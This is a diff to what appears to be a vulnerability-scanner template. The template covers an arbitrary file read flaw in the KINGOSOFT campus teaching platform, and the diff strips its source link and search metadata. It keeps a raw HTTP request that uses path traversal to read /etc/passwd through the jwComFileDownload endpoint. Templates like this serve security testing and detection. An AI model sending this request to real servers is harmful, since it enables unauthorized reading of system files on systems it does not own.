@@ -3,12 +3,8 @@ info:
   name: KINGOSOFT高校智慧校园教学综合服务平台 jwComFileDownload 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hkewb3go8yfbbxf3'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hkewb3go8yfbbxf3
-    fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
 http:
 - raw:
   - 'GET /jw/lessonchangeapply/jwComFileDownload.action?fileSavePath=../../../../../../../etc/passwd&name= HTTP/1.1
